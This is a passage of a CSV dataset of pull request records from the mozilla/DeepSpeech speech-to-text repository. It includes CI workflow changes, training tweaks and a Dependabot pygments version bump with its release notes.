,pullid,pulls_number,pulltitle,pullsbody,pullsuserlogin,pullsuserid,pullauthordate,author_association,merged_status,stats_addns,stats_delns,stats_changed_files,pull_repo_desc,pull_repo_lang,pull_commit_sha,pull_commit_message
0,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3600,3600,Fix documentation for check_characters.py script,Closes #3599,CatalinVoss,332459,2021-04-04T00:46:28Z,COLLABORATOR,False,7,4,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6279b59875b10d429c5a26666887b010a30c7527,Fix documentation for check_characters.py script
1,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3598,3598,Fix #3586: NumPy versions,,lissyx,1645737,2021-04-02T12:43:24Z,COLLABORATOR,False,131,1,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,aed5f187cea0ca343cf3fe4a7278ef98fd0d5561,Fix #3586: NumPy versions
2,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3595,3595,WIP: Split workflows,,lissyx,1645737,2021-03-31T15:30:35Z,COLLABORATOR,False,67,5,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5372cb3105d680dbcd5f1c361f067ba01caa6d41,WIP: Split workflows
3,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3594,3594,Fix #3593: Limit tests to PR,,lissyx,1645737,2021-03-31T11:50:55Z,COLLABORATOR,True,6,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3e1afe07eb4197b77ff1ba4f6f3b2d4df47031cb,Fix #3593: Limit tests to PR
4,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3592,3592,Add option for output file,,stellarpower,5004545,2021-03-30T23:22:25Z,NONE,False,10,3,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c936797aba30841a4baec283457b36335673c8f7,Add option for output file
5,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3591,3591,Fix #3590: Move training to macOS,,lissyx,1645737,2021-03-30T11:30:47Z,COLLABORATOR,True,39,16,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ecc0451229424d7deacf1a6ed3ce0d9ffcf7fb46,Fix #3590: Move training to macOS
6,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3589,3589,WIP Windows CI direct,,reuben,477142,2021-03-30T10:33:53Z,MEMBER,False,417,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e7952e478506387c85959f23f859c65996dd3595,WIP Windows CI direct
7,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3587,3587,Bump pygments from 2.6.1 to 2.7.4 in /taskcluster,"Bumps [pygments](https://github.com/pygments/pygments) from 2.6.1 to 2.7.4.
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/pygments/pygments/releases"">pygments's releases</a>.</em></p>
<blockquote>
<h2>2.7.4</h2>
<ul>
<li>
<p>Updated lexers:</p>
<ul>
<li>
<p>Apache configurations: Improve handling of malformed tags (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1656"">#1656</a>)</p>
</li>
<li>
<p>CSS: Add support for variables (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1633"">#1633</a>, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1666"">#1666</a>)</p>
</li>
<li>
<p>Crystal (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1650"">#1650</a>, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1670"">#1670</a>)</p>
</li>
<li>
<p>Coq (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1648"">#1648</a>)</p>
</li>
<li>
<p>Fortran: Add missing keywords (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1635"">#1635</a>, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1665"">#1665</a>)</p>
</li>
<li>
<p>Ini (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1624"">#1624</a>)</p>
</li>
<li>
<p>JavaScript and variants (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1647"">#1647</a> -- missing regex flags, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1651"">#1651</a>)</p>
</li>
<li>
<p>Markdown (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1623"">#1623</a>, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1617"">#1617</a>)</p>
</li>
<li>
<p>Shell</p>
<ul>
<li>Lex trailing whitespace as part of the prompt (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1645"">#1645</a>)</li>
<li>Add missing <code>in</code> keyword (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1652"">#1652</a>)</li>
</ul>
</li>
<li>
<p>SQL - Fix keywords (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1668"">#1668</a>)</p>
</li>
<li>
<p>Typescript: Fix incorrect punctuation handling (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1510"">#1510</a>, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1511"">#1511</a>)</p>
</li>
</ul>
</li>
<li>
<p>Fix infinite loop in SML lexer (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1625"">#1625</a>)</p>
</li>
<li>
<p>Fix backtracking string regexes in JavaScript/TypeScript, Modula2
and many other lexers (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1637"">#1637</a>)</p>
</li>
<li>
<p>Limit recursion with nesting Ruby heredocs (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1638"">#1638</a>)</p>
</li>
<li>
<p>Fix a few inefficient regexes for guessing lexers</p>
</li>
<li>
<p>Fix the raw token lexer handling of Unicode (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1616"">#1616</a>)</p>
</li>
<li>
<p>Revert a private API change in the HTML formatter (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1655"">#1655</a>) --
please note that private APIs remain subject to change!</p>
</li>
<li>
<p>Fix several exponential/cubic-complexity regexes found by
Ben Caller/Doyensec (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1675"">#1675</a>)</p>
</li>
<li>
<p>Fix incorrect MATLAB example (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1582"">#1582</a>)</p>
</li>
</ul>
<p>Thanks to Google's OSS-Fuzz project for finding many of these bugs.</p>
<h2>2.7.3</h2>
<ul>
<li>
<p>Updated lexers:</p>
<ul>
<li>Ada (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1581"">#1581</a>)</li>
<li>HTML (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1615"">#1615</a>, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1614"">#1614</a>)</li>
<li>Java (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1594"">#1594</a>, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1586"">#1586</a>)</li>
<li>JavaScript (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1605"">#1605</a>, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1589"">#1589</a>, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1588"">#1588</a>)</li>
<li>JSON (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1569"">#1569</a> -- this is a complete rewrite)</li>
<li>Lean (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1601"">#1601</a>)</li>
<li>LLVM (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1612"">#1612</a>)</li>
<li>Mason (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1592"">#1592</a>)</li>
<li>MySQL (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1555"">#1555</a>, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1551"">#1551</a>)</li>
<li>Rust (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1608"">#1608</a>)</li>
<li>Turtle (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1590"">#1590</a>, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1553"">#1553</a>)</li>
</ul>
</li>
<li>
<p>Deprecated JsonBareObjectLexer, which is now identical to JsonLexer (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1600"">#1600</a>)</p>
</li>
<li>
<p>The <code>ImgFormatter</code> now calculates the exact character width, which fixes some issues with overlapping text (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1213"">#1213</a>, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1611"">#1611</a>)</p>
</li>
</ul>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/pygments/pygments/blob/master/CHANGES"">pygments's changelog</a>.</em></p>
<blockquote>
<h2>Version 2.7.4</h2>
<p>(released January 12, 2021)</p>
<ul>
<li>
<p>Updated lexers:</p>
<ul>
<li>
<p>Apache configurations: Improve handling of malformed tags (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1656"">#1656</a>)</p>
</li>
<li>
<p>CSS: Add support for variables (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1633"">#1633</a>, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1666"">#1666</a>)</p>
</li>
<li>
<p>Crystal (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1650"">#1650</a>, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1670"">#1670</a>)</p>
</li>
<li>
<p>Coq (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1648"">#1648</a>)</p>
</li>
<li>
<p>Fortran: Add missing keywords (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1635"">#1635</a>, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1665"">#1665</a>)</p>
</li>
<li>
<p>Ini (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1624"">#1624</a>)</p>
</li>
<li>
<p>JavaScript and variants (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1647"">#1647</a> -- missing regex flags, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1651"">#1651</a>)</p>
</li>
<li>
<p>Markdown (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1623"">#1623</a>, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1617"">#1617</a>)</p>
</li>
<li>
<p>Shell</p>
<ul>
<li>Lex trailing whitespace as part of the prompt (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1645"">#1645</a>)</li>
<li>Add missing <code>in</code> keyword (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1652"">#1652</a>)</li>
</ul>
</li>
<li>
<p>SQL - Fix keywords (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1668"">#1668</a>)</p>
</li>
<li>
<p>Typescript: Fix incorrect punctuation handling (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1510"">#1510</a>, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1511"">#1511</a>)</p>
</li>
</ul>
</li>
<li>
<p>Fix infinite loop in SML lexer (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1625"">#1625</a>)</p>
</li>
<li>
<p>Fix backtracking string regexes in JavaScript/TypeScript, Modula2
and many other lexers (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1637"">#1637</a>)</p>
</li>
<li>
<p>Limit recursion with nesting Ruby heredocs (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1638"">#1638</a>)</p>
</li>
<li>
<p>Fix a few inefficient regexes for guessing lexers</p>
</li>
<li>
<p>Fix the raw token lexer handling of Unicode (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1616"">#1616</a>)</p>
</li>
<li>
<p>Revert a private API change in the HTML formatter (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1655"">#1655</a>) --
please note that private APIs remain subject to change!</p>
</li>
<li>
<p>Fix several exponential/cubic-complexity regexes found by
Ben Caller/Doyensec (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1675"">#1675</a>)</p>
</li>
<li>
<p>Fix incorrect MATLAB example (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1582"">#1582</a>)</p>
</li>
</ul>
<p>Thanks to Google's OSS-Fuzz project for finding many of these bugs.</p>
<h2>Version 2.7.3</h2>
<p>(released December 6, 2020)</p>
<ul>
<li>
<p>Updated lexers:</p>
<ul>
<li>Ada (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1581"">#1581</a>)</li>
<li>HTML (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1615"">#1615</a>, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1614"">#1614</a>)</li>
<li>Java (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1594"">#1594</a>, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1586"">#1586</a>)</li>
<li>JavaScript (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1605"">#1605</a>, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1589"">#1589</a>, <a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1588"">#1588</a>)</li>
<li>JSON (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1569"">#1569</a> -- this is a complete rewrite)</li>
<li>Lean (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1601"">#1601</a>)</li>
<li>LLVM (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1612"">#1612</a>)</li>
<li>Mason (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1592"">#1592</a>)</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/pygments/pygments/commit/4d555d0fffc914a2a4ac9874416cdaaf8f8c9e74""><code>4d555d0</code></a> Bump version to 2.7.4.</li>
<li><a href=""https://github.com/pygments/pygments/commit/fc3b05ddf25933e45f670534f79fd1df870e142a""><code>fc3b05d</code></a> Update CHANGES.</li>
<li><a href=""https://github.com/pygments/pygments/commit/ad21935815ff6402d402b036e204f0333a77031b""><code>ad21935</code></a> Revert &quot;Added dracula theme style (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1636"">#1636</a>)&quot;</li>
<li><a href=""https://github.com/pygments/pygments/commit/e411506a23a39f4487ecc36afb616cc4715eb571""><code>e411506</code></a> Prepare for 2.7.4 release.</li>
<li><a href=""https://github.com/pygments/pygments/commit/275e34d8f0d265bd474f269471b41c635fe559ff""><code>275e34d</code></a> doc: remove Perl 6 ref</li>
<li><a href=""https://github.com/pygments/pygments/commit/2e7e8c4a7b318f4032493773732754e418279a14""><code>2e7e8c4</code></a> Fix several exponential/cubic complexity regexes found by Ben Caller/Doyensec</li>
<li><a href=""https://github.com/pygments/pygments/commit/eb39c43b6ef992abadb0d25f0504d0cf2f3ccd86""><code>eb39c43</code></a> xquery: fix pop from empty stack</li>
<li><a href=""https://github.com/pygments/pygments/commit/2738778c0b9c615bfcae68972fc656d351d676ca""><code>2738778</code></a> fix coding style in test_analyzer_lexer</li>
<li><a href=""https://github.com/pygments/pygments/commit/02e0f09d796cca5174181e7ae3971cdc010e39b0""><code>02e0f09</code></a> Added 'ERROR STOP' to fortran.py keywords. (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1665"">#1665</a>)</li>
<li><a href=""https://github.com/pygments/pygments/commit/c83fe4888868f79415b50f050c047dc7fe11fd3b""><code>c83fe48</code></a> support added for css variables (<a href=""https://github-redirect.dependabot.com/pygments/pygments/issues/1633"">#1633</a>)</li>
<li>Additional commits viewable in <a href=""https://github.com/pygments/pygments/compare/2.6.1...2.7.4"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=pygments&package-manager=pip&previous-version=2.6.1&new-version=2.7.4)](https://docs.github.com/en/github/managing-security-vulnerabilities/about-dependabot-security-updates#about-compatibility-scores)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language

You can disable automated security fix PRs for this repo from the [Security Alerts page](https://github.com/mozilla/DeepSpeech/network/alerts).

</details>",dependabot[bot],49699333,2021-03-29T20:38:41Z,NONE,False,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1688f1ebb02b9f818cf694eba64743cfc98a20fa,"Bump pygments from 2.6.1 to 2.7.4 in /taskcluster

Bumps [pygments](https://github.com/pygments/pygments) from 2.6.1 to 2.7.4.
- [Release notes](https://github.com/pygments/pygments/releases)
- [Changelog](https://github.com/pygments/pygments/blob/master/CHANGES)
- [Commits](https://github.com/pygments/pygments/compare/2.6.1...2.7.4)

Signed-off-by: dependabot[bot] <support@github.com>"
8,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3585,3585,Fix #3578: Re-instate Python TF/TFLite tests on GitHub Actions / macOS,,lissyx,1645737,2021-03-29T09:49:56Z,COLLABORATOR,True,441,14,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e6f3b8ec50c67c41911f6088bc151a3f0b131d70,Fix #3578: Re-instate Python TF/TFLite tests on GitHub Actions / macOS
9,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3583,3583,Train test model ga test,,lissyx,1645737,2021-03-26T15:01:36Z,COLLABORATOR,False,92,7,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,936380836d271784a894d898d52d9054ebaa2bdb,Dummy train test
10,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3583,3583,Train test model ga test,,lissyx,1645737,2021-03-26T15:01:36Z,COLLABORATOR,False,92,7,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,01ef3d946f7d6ac02ee14e3c97c56fdce71706cf,Fix #3581: GitHub Actions test model
11,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3582,3582,Fix #3581: GitHub Actions test model,,lissyx,1645737,2021-03-26T08:56:54Z,COLLABORATOR,True,125,11,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,049d83286955ed4ad96ff549763514d114fadd17,Fix #3581: GitHub Actions test model
12,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3577,3577,Introduce ci_scripts/ for GitHub Actions,,lissyx,1645737,2021-03-25T15:21:19Z,COLLABORATOR,True,1589,6,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8120bd5685df779eb6b188412ec41248ab98ceac,Introduce ci_scripts/ for GitHub Actions
13,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3576,3576,"add more comment, fix bugs",https://github.com/coqui-ai/STT/discussions/1818,zh794390558,3038472,2021-03-25T06:22:48Z,NONE,False,215,104,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,92d56d6e10f3e0ae66c81b643a7a099b1558d10d,"add more comment, fix bugs"
14,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3571,3571,Replace `remove_remote()` method with `remove` method,Partially resolves #3569,KathyReid,114158,2021-03-24T02:22:51Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b2bac3c5e6de5d60bcf4bc555599ac75af75551c,"Replace remove_remote() method with remove method

Partially resolves #3569"
15,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3570,3570,Replace `remove_remote()` method with `remove` method,Partially resolves #3569,KathyReid,114158,2021-03-24T02:16:41Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,79fde141b6af6a12202e3faa6f03ea0dfdde7241,"Replace `remove_remote()` method with `remove` method

Partially resolves #3569"
16,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3564,3564,Small Training Tweaks,"This PR cleans up #3559 per @lissyx's request.

Now adds the following two bits:
1. https://github.com/mozilla/DeepSpeech/commit/66f4ed4c65a54ed2e84b263abbfb78ae696b5d40 exposes a couple of the hidden per-CTC-output layers for downstream applications that wish to use deepspeech internal representations
2. https://github.com/mozilla/DeepSpeech/commit/877fef9f2eb49f51a7fa02cd22af312f11c1e957 and https://github.com/mozilla/DeepSpeech/commit/444654036763bdf2bb50826a38426a6f62352963 add multi-channel-to-mono conversion along the way to the `pcm_to_np()` function. In a previous PR (#3512), I had proposed using `AudioFile` as a wrapper for all samples to handle sample rate and channel conversion. @reuben pointed out that sample rate was already handled elsewhere and that TensorFlow's functions can actually handle multi-channel audio just fine. Both are correct, of course, but the training code currently still threw an error when handed multi-channel files. To get past that, I tried briefly to see if I could just eliminate the warning and pass multi-channel audio, either interleaved or as a 2-column matrix for stereo, but this breaks downstream (for interleaved, the CTCs become garbage, if I return two column vectors here, I get 2x the CTCs and the decoder produces the same output twice). So I did the channel conversion right here along the way. I think this has some benefits as well as we really only care about performing the downstream augmentations and training on mono audio ever, so it seems prudent performance-wise to always read it in as mono…

@reuben for (2), please reference this discussion: https://github.com/mozilla/DeepSpeech/pull/3559#discussion_r597663725",CatalinVoss,332459,2021-03-19T20:07:16Z,COLLABORATOR,True,18,5,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d9bf55c39fb670cc3412c6d56fd692f77ae55e3d,Expose some internal layers for downstream applications
17,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3564,3564,Small Training Tweaks,"This PR cleans up #3559 per @lissyx's request.

Now adds the following two bits:
1. https://github.com/mozilla/DeepSpeech/commit/66f4ed4c65a54ed2e84b263abbfb78ae696b5d40 exposes a couple of the hidden per-CTC-output layers for downstream applications that wish to use deepspeech internal representations
2. https://github.com/mozilla/DeepSpeech/commit/877fef9f2eb49f51a7fa02cd22af312f11c1e957 and https://github.com/mozilla/DeepSpeech/commit/444654036763bdf2bb50826a38426a6f62352963 add multi-channel-to-mono conversion along the way to the `pcm_to_np()` function. In a previous PR (#3512), I had proposed using `AudioFile` as a wrapper for all samples to handle sample rate and channel conversion. @reuben pointed out that sample rate was already handled elsewhere and that TensorFlow's functions can actually handle multi-channel audio just fine. Both are correct, of course, but the training code currently still threw an error when handed multi-channel files. To get past that, I tried briefly to see if I could just eliminate the warning and pass multi-channel audio, either interleaved or as a 2-column matrix for stereo, but this breaks downstream (for interleaved, the CTCs become garbage, if I return two column vectors here, I get 2x the CTCs and the decoder produces the same output twice). So I did the channel conversion right here along the way. I think this has some benefits as well as we really only care about performing the downstream augmentations and training on mono audio ever, so it seems prudent performance-wise to always read it in as mono…

@reuben for (2), please reference this discussion: https://github.com/mozilla/DeepSpeech/pull/3559#discussion_r597663725",CatalinVoss,332459,2021-03-19T20:07:16Z,COLLABORATOR,True,18,5,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f31ce5ca48af8912d32025511fdfff6e841ed2bd,Don't throw on mono audio any more since everything should work?
18,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3564,3564,Small Training Tweaks,"This PR cleans up #3559 per @lissyx's request.

Now adds the following two bits:
1. https://github.com/mozilla/DeepSpeech/commit/66f4ed4c65a54ed2e84b263abbfb78ae696b5d40 exposes a couple of the hidden per-CTC-output layers for downstream applications that wish to use deepspeech internal representations
2. https://github.com/mozilla/DeepSpeech/commit/877fef9f2eb49f51a7fa02cd22af312f11c1e957 and https://github.com/mozilla/DeepSpeech/commit/444654036763bdf2bb50826a38426a6f62352963 add multi-channel-to-mono conversion along the way to the `pcm_to_np()` function. In a previous PR (#3512), I had proposed using `AudioFile` as a wrapper for all samples to handle sample rate and channel conversion. @reuben pointed out that sample rate was already handled elsewhere and that TensorFlow's functions can actually handle multi-channel audio just fine. Both are correct, of course, but the training code currently still threw an error when handed multi-channel files. To get past that, I tried briefly to see if I could just eliminate the warning and pass multi-channel audio, either interleaved or as a 2-column matrix for stereo, but this breaks downstream (for interleaved, the CTCs become garbage, if I return two column vectors here, I get 2x the CTCs and the decoder produces the same output twice). So I did the channel conversion right here along the way. I think this has some benefits as well as we really only care about performing the downstream augmentations and training on mono audio ever, so it seems prudent performance-wise to always read it in as mono…

@reuben for (2), please reference this discussion: https://github.com/mozilla/DeepSpeech/pull/3559#discussion_r597663725",CatalinVoss,332459,2021-03-19T20:07:16Z,COLLABORATOR,True,18,5,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b0db7b6f8feaa70c6c192a2cea94af3bf36fba44,Handle mono conversion within `pcm_to_np()`
19,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3563,3563,GitHub Actions for macOS,,lissyx,1645737,2021-03-19T19:39:44Z,COLLABORATOR,True,10329,58,40,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5e4d7dae99652e9e4be7e05910f8050ff7532440,GitHub Actions for macOS
20,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3560,3560,Fix #3549: Update KenLM,,lissyx,1645737,2021-03-17T09:02:19Z,COLLABORATOR,True,21,19,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,aef96b57a89452c23f66b507e4631c36bc51dac0,"MSVC doesn't like const Proxy operator*() const.

Fixes #308"
21,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3560,3560,Fix #3549: Update KenLM,,lissyx,1645737,2021-03-17T09:02:19Z,COLLABORATOR,True,21,19,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,de5f3b2a9968dfe7073f777714ecf4c6590d9e4e,Fix #3549
22,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3559,3559,Small Training Tweaks,"This PR proposes three small training tweaks. Pick and choose as you please, of course.

1. https://github.com/mozilla/DeepSpeech/commit/66f4ed4c65a54ed2e84b263abbfb78ae696b5d40 exposes a couple of the hidden per-CTC-output layers for downstream applications that wish to use deepspeech internal representations
2. ~https://github.com/mozilla/DeepSpeech/commit/2c1b893004e523874465fd18770234692265d51a adds the `ignore_longer_outputs_than_inputs` flag to the tensorflow `ctc_loss` signal. We've found this necessary when training with some slightly messier data. Yes, this should never happen if your data is clean enough, but that's not a guarantee and calculating this as a sanity check upfront can sometimes be difficult. This shouldn't affect DeepSpeech training as it stands, but if you're concerned about it from a ""warning"" standpoint, I suppose one could add a print op here when it does happen.~
